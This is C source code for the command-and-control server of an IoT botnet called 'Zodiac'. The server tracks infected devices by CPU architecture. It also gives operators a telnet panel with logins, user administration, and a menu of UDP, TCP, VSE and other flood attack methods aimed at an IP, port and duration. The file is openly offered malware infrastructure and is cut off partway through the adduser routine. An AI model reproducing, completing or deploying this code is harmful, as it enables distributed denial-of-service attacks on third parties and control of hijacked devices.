#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>

#include "Functions/resolver.h"
#include "Functions/killer.h"

#define MAXFDS 1000000

struct account {
  char user[200];
  char password[200];
  char id [200];
};
static struct account accounts[50];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\e[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

          clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

          int dup = 0;
          for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
          {
            if (!clients[ipIndex].connected || ipIndex == infd) continue;

            if (clients[ipIndex].ip == clients[infd].ip)
            {
              dup = 1;
              break;
            }
          }

          if (dup)
          {
            DUPESDELETED++;
            continue;
          }

          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "~ SC ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int datafd = events[i].data.fd;
        struct clientdata_t *client = &(clients[datafd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }  
              continue;
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mx86_64\e[1;37m ]") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mx86_32\e[1;37m ]") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mMIPS\e[1;37m ]") == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mMIPSL\e[1;37m ]") == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mARM4\e[1;37m ]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mARM5\e[1;37m ]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mARM6\e[1;37m ]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mARM7\e[1;37m ]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mPPC\e[1;37m ]") == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;32mZodiac\e[1;37m] \e[1;37m[ \e[0;32mSPC\e[1;37m ]") == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } 
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(datafd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock) 
    {
        int datafd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; %d IoT %c", '\033', clientsConnected(), '\007');
            if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("Info/User_Logins.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("[\e[97m%d.%d.%d.%d\e[97m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("Info/IP.log", "a");
  fprintf(logFile, "\nIP:[\e[97m%d.%d.%d.%d\e[97m] ",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {
  int datafd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin"; 
  memset(buf, 0, sizeof buf);
  char botnet[2048];
  memset(botnet, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("Info/User_Logins.txt", "r");
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id); 
    ++j;
  }
   sprintf(botnet, "\e[1;37mUsername\e[0;32m: \e[1;37m");
  if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == (-1))goto end;
  if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

  if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\e[1;37mPassword\e[0;32m:\e[1;37m ");
    if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
    
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
  }
failed:
        if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        char failed_line1[80];
 
        sprintf(failed_line1, "\e[0;32mUsername \e[1;37mor \e[0;32mPassword \e[1;37mis wrong\e[0;32m! \e[1;37mplease try again\e[0;32m. \e[1;37mor just fuck off\r\n");
        if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
        sleep(5);
        goto end;

        Banner: 
        pthread_create(&title, NULL, &titleWriter, sock); 
        if (send(datafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; 
        char Banner_1 [90000]; 
        char Banner_2 [90000]; 
        char Banner_3 [90000]; 
        char Banner_4 [90000]; 
        char Banner_5 [90000]; 
        char Banner_6 [90000]; 
        char Banner_7 [90000]; 
        char Banner_8 [90000]; 
        char Banner_9 [90000];

        sprintf(Banner_1,   "\e[97m                                                            \r\n");
        sprintf(Banner_2,   "\e[97m           \e[1;37m     ███████\e[0;32m╗ \e[1;37m██████\e[0;32m╗\e[1;37m ██████\e[0;32m╗\e[1;37m ██\e[0;32m╗\e[1;37m █████\e[0;32m╗ \e[1;37m █████\e[0;32m╗\r\n");
        sprintf(Banner_3,   "\e[97m           \e[1;37m    \e[0;32m ╚══\e[1;37m███\e[0;32m╔╝\e[1;37m██\e[0;32m╔═══\e[1;37m██\e[0;32m╗\e[1;37m██\e[0;32m╔══\e[1;37m██\e[0;32m╗\e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m╔══\e[1;37m██\e[0;32m╗\e[1;37m██\e[0;32m╔═══╝\r\n");
        sprintf(Banner_4,   "\e[97m           \e[1;37m       ███\e[0;32m╔╝ \e[1;37m██\e[0;32m║   \e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m║ \e[1;37m ██\e[0;32m║\e[1;37m██\e[0;32m║\e[1;37m███████\e[0;32m║\e[1;37m██\e[0;32m║\r\n");
        sprintf(Banner_5,   "\e[97m           \e[1;37m      \e[1;37m███\e[0;32m╔╝  \e[1;37m██\e[0;32m║   \e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m║  \e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m╔══\e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m║\r\n");
        sprintf(Banner_6,   "\e[97m           \e[1;37m     ███████\e[0;32m╗╚\e[1;37m██████\e[0;32m╔╝\e[1;37m██████\e[0;32m╔╝\e[1;37m██\e[0;32m║\e[1;37m██\e[0;32m║  \e[1;37m██\e[0;32m║╚\e[1;37m██████\e[0;32m╗\r\n");
        sprintf(Banner_7,   "\e[97m           \e[1;37m     \e[0;32m╚══════╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝\r\n\n");
        sprintf(Banner_9,   "\e[97m           \e[1;37m Type \e[0;32m? \e[1;37mfor Cmds or Type \e[0;32mContact \e[1;37mfor owners discords\r\n\n");
        sprintf(Banner_8,   "\e\r\n");


        if(send(datafd, Banner_1, strlen(Banner_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_2, strlen(Banner_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_3, strlen(Banner_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_4, strlen(Banner_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_5, strlen(Banner_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_6, strlen(Banner_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_7, strlen(Banner_7), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_8, strlen(Banner_8), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_9, strlen(Banner_9), MSG_NOSIGNAL) == -1) goto end;


        { 
        sprintf(botnet, "\e[1;37mゾディアック\e[1;32m: \e[1;37m", accounts[find_line].user, buf); 
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; 
        sprintf(botnet, "\e[1;37mゾディアック\e[1;32m: \e[1;37m", accounts[find_line].user, buf); 
        } 
        pthread_create(&title, NULL, &titleWriter, sock); 
        managements[datafd].connected = 1; 

        while(fdgets(buf, sizeof buf, datafd) > 0)
        { 


      if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "Bots") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "count") || strstr(buf, "COUNT")) {
            char mips[128];
            char sh4[128];
            char arm4[128];
            char ppc[128];
            char x86[128];
            char spc[128];
            char ttl[128];
      
            sprintf(mips, "\e[1;37mmips \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",     mipsConnected());
            sprintf(arm4, "\e[1;37marm \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",   armConnected());
            sprintf(ppc, "\e[1;37msh4 \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",      sh4Connected());
            sprintf(x86, "\e[1;37mppc \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",     ppcConnected());
            sprintf(spc, "\e[1;37mx86 \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",     x86Connected());
            sprintf(sh4, "\e[1;37mspc \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",     spcConnected());
            sprintf(ttl, "\e[1;37mtotal \e[0;32m[\e[1;37m%d\e[0;32m]\e[0;32m\r\n",  clientsConnected());
            if(send(datafd, arm4, strlen(arm4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
      if(send(datafd, ttl, strlen(ttl), MSG_NOSIGNAL) == -1) goto end; 
      pthread_create(&title, NULL, &titleWriter, sock);
    char input [5000];
        sprintf(input, "\e[1;37mゾディアック\e[1;32m: \e[1;37m");
    if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        continue;
      }
            if(strstr(buf, "?") || strstr(buf, "Help") || strstr(buf, "help") || strstr(buf, "HELP")) {
        pthread_create(&title, NULL, &titleWriter, sock);
        char help1  [800];
        char help2  [800];
        char help3  [800];
        char help4  [800];
        char help5  [800];
        char help7  [800];

        sprintf(help1, "\e[1;37m╔═══════════════════════════════════╗\e[1;37m\r\n");
        sprintf(help2, "\e[1;37m║\e[0;32mMethods \e[1;37m->  \e[0;32mShows Attack methods   \e[1;37m║\e[1;37m\r\n");
        sprintf(help3, "\e[1;37m║\e[0;32mTools   \e[1;37m->  \e[0;32mShows Tools            \e[1;37m║\e[1;37m\r\n");
        sprintf(help4, "\e[1;37m║\e[0;32mBots    \e[1;37m->  \e[0;32mShows Bots/Archs       \e[1;37m║\e[1;37m\r\n");
        sprintf(help5, "\e[1;37m║\e[0;32mClear   \e[1;37m->  \e[0;32mClears Screen          \e[1;37m║\e[1;37m\r\n");
        sprintf(help7, "\e[1;37m╚═══════════════════════════════════╝\e[1;37m\r\n");

        if(send(datafd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, help5,  strlen(help5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, help7,  strlen(help7),  MSG_NOSIGNAL) == -1) goto end;


                pthread_create(&title, NULL, &titleWriter, sock);
    char input [5000];
        sprintf(input, "\e[1;37mゾディアック\e[1;32m: \e[1;37m");
    if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        continue;
        }
    if(strstr(buf, "Tools") || strstr(buf, "tools") || strstr(buf, "TOOLS")) {
        pthread_create(&title, NULL, &titleWriter, sock);
        char tools_1  [800];
        char tools_2  [800];
        char tools_3  [800];
        char tools_6  [800];

        sprintf(tools_1, "\e[0;32m╔═══════════════════════════════════╗\e[1;37m\r\n");
        sprintf(tools_2, "\e[0;32m║\e[1;37mIPlookup\e[0;32m->  \e[1;37mIPLOOKUP [IP]          \e[0;32m║\e[1;37m\r\n");
        sprintf(tools_3, "\e[0;32m║\e[1;37mResolver\e[0;32m->  \e[1;37mresolve [IP]           \e[0;32m║\e[1;37m\r\n");
        sprintf(tools_6, "\e[0;32m╚═══════════════════════════════════╝\e[1;37m\r\n");

        if(send(datafd, tools_1,  strlen(tools_1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, tools_2,  strlen(tools_2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, tools_3,  strlen(tools_3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, tools_6,  strlen(tools_6),  MSG_NOSIGNAL) == -1) goto end;


                pthread_create(&title, NULL, &titleWriter, sock);
    char input [5000];
        sprintf(input, "\e[1;37mゾディアック\e[1;32m: \e[1;37m");
    if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        continue;
        }
     if(strstr(buf, "Contact") || strstr(buf, "contact") || strstr(buf, "CONTACT")) {
        pthread_create(&title, NULL, &titleWriter, sock);
        char contact_1  [800];
        char contact_2  [800];
        char contact_3  [800];
        char contact_4  [800];

        sprintf(contact_1, "\e[0;32m╔═══════════════════════════════════╗\e[1;37m\r\n");
        sprintf(contact_2, "\e[0;32m║\e[1;37mQuote   \e[0;32m->  \e[1;37mQuote#7149\e[0;32m             ║\e[1;37m\r\n");
        sprintf(contact_3, "\e[0;32m║\e[1;37mEonds   \e[0;32m->  \e[1;37mEonds#7693\e[0;32m             ║\e[1;37m\r\n");
        sprintf(contact_4, "\e[0;32m╚═══════════════════════════════════╝\e[1;37m\r\n");

        if(send(datafd, contact_1,  strlen(contact_1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, contact_2,  strlen(contact_2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, contact_3,  strlen(contact_3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, contact_4,  strlen(contact_4),  MSG_NOSIGNAL) == -1) goto end;


                pthread_create(&title, NULL, &titleWriter, sock);
    char input [5000];
        sprintf(input, "\e[1;37mゾディアック\e[1;32m: \e[1;37m");
    if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        continue;
        }
              if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
        char clearscreen [2048];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");
        if(send(datafd, clearscreen,      strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, Banner_1, strlen(Banner_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_2, strlen(Banner_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_3, strlen(Banner_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_4, strlen(Banner_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_5, strlen(Banner_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_6, strlen(Banner_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_7, strlen(Banner_7), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_8, strlen(Banner_8), MSG_NOSIGNAL) == -1) goto end; 
        if(send(datafd, Banner_9, strlen(Banner_9), MSG_NOSIGNAL) == -1) goto end;

        while(1) {
    char input [5000];
        sprintf(input, "\e[1;37mゾディアック\e[1;32m: \e[1;37m");
    if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
      }
              if(strstr(buf, "attack") || strstr(buf, "ATTACK") || strstr(buf, "atk") || strstr(buf, "Attack") || strstr(buf, "METHOD") || strstr(buf, "method") || strstr(buf, "Method") || strstr(buf, "METHODS") || strstr(buf, "methods") || strstr(buf, "Methods")) {
        pthread_create(&title, NULL, &titleWriter, sock);
        char methods1  [800];
        char methods2  [800];
        char methods3  [800];
        char methods5  [800];
        char methods6  [800];
        char methods7  [800];
        char methods8  [800];
        char methods9  [800];
        char methods10  [800];
        char methods17  [800];
                 
        sprintf(methods1,  "\e[0;32m╔═════════════════════════════════════╗\e[0;32m\r\n");
        sprintf(methods2,  "\e[0;32m║               \e[1;37mLayer 4               \e[0;32m║\e[1;37m\r\n");
        sprintf(methods3,  "\e[0;32m╠═════════════════════════════════════╣\e[0;32m\r\n");
        sprintf(methods5,  "\e[0;32m║\e[0;32m . \e[1;37mSTD \e[0;32m[\e[1;37mIP\e[0;32m] [\e[1;37mPORT\e[0;32m] [\e[1;37mTIME\e[0;32m] \e[1;37m           \e[0;32m║\e[1;37m\r\n");
        sprintf(methods6,  "\e[0;32m║\e[0;32m . \e[1;37mHEX \e[0;32m[\e[1;37mIP\e[0;32m] [\e[1;37mPORT\e[0;32m] [\e[1;37mTIME\e[0;32m] \e[1;37m1460       \e[0;32m║\e[1;37m\r\n");
        sprintf(methods7,  "\e[0;32m║\e[0;32m . \e[1;37mUDP \e[0;32m[\e[1;37mIP\e[0;32m] [\e[1;37mPORT\e[0;32m] [\e[1;37mTIME\e[0;32m] \e[1;37m32 0 10    \e[0;32m║\e[1;37m\r\n");
        sprintf(methods8,  "\e[0;32m║\e[0;32m . \e[1;37mVSE \e[0;32m[\e[1;37mIP\e[0;32m] [\e[1;37mPORT\e[0;32m] [\e[1;37mTIME\e[0;32m] \e[1;37m32 0 10    \e[0;32m║\e[1;37m\r\n");
        sprintf(methods9,  "\e[0;32m║\e[0;32m . \e[1;37mXMS \e[0;32m[\e[1;37mIP\e[0;32m] [\e[1;37mPORT\e[0;32m] [\e[1;37mTIME\e[0;32m] \e[1;37m32 0 10    \e[0;32m║\e[1;37m\r\n");
        sprintf(methods10,  "\e[0;32m║\e[0;32m . \e[1;37mTCP \e[0;32m[\e[1;37mIP\e[0;32m] [\e[1;37mPORT\e[0;32m] [\e[1;37mTIME\e[0;32m] \e[1;37m32 all 0 10\e[0;32m║\e[1;37m\r\n");
        sprintf(methods17,  "\e[0;32m╚═════════════════════════════════════╝\e[1;37m\r\n");

        if(send(datafd, methods1,  strlen(methods1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods2,  strlen(methods2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods3,  strlen(methods3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods5,  strlen(methods5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods6,  strlen(methods6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods7,  strlen(methods7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods8,  strlen(methods8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods9,  strlen(methods9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods10,  strlen(methods10),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, methods17,  strlen(methods17),  MSG_NOSIGNAL) == -1) goto end;


        pthread_create(&title, NULL, &titleWriter, sock);
    char input [5000];
        sprintf(input, "\e[1;37mゾディアック\e[1;32m: \e[1;37m");
    if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        continue;
    }
    else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
{
    if(strcmp(admin, accounts[find_line].id) == 0)
    {
        char username[80];
        char password[80];
        char admin[80];
        char cmd[512];
        char send1[512];
        sprintf(botnet, "\e[0;32mUsername\e[0;37m:" );
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        memset(buf, 0, sizeof buf);
        if(fdgets(buf, sizeof(buf), datafd) < 1);
        trim(buf);
        strcpy(username, buf);
        sprintf(botnet, "\e[0;32mPassword\e[0;37m:" );
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        memset(buf,0,sizeof(buf));
        if(fdgets(buf, sizeof(buf), datafd) < 1);
        trim(buf);
        strcpy(password, buf);
        sprintf(botnet, "\e[0;32mAdmin\e[0;32m?\e[32m[\e[0;32mYes or no?\e[32m]\e[0;37m:" );
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        memset(buf,0,sizeof(buf));
        if(fdgets(buf, sizeof(buf), datafd) < 1);
        trim(buf);
        if (strstr(buf, "yes") || strstr(buf, "YES") || strstr(buf, "Yes"))
        {
          strcpy(admin, "admin");
        }
        else
        {
          strcpy(admin, "client");
